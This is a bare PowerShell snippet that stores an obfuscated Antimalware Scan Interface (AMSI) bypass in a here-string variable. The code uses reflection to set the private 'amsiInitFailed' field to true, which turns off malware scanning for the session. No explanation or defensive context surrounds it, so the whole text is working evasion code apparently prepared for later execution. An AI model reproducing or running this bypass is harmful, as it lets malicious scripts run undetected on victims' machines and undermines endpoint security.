$datos=@"
$amssdiI3nitgatTGFRDTFailedFielsdd=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
$amssdiI3nitgatTGFRDTFailedFielsdd.SetValue($null, $true)
"@
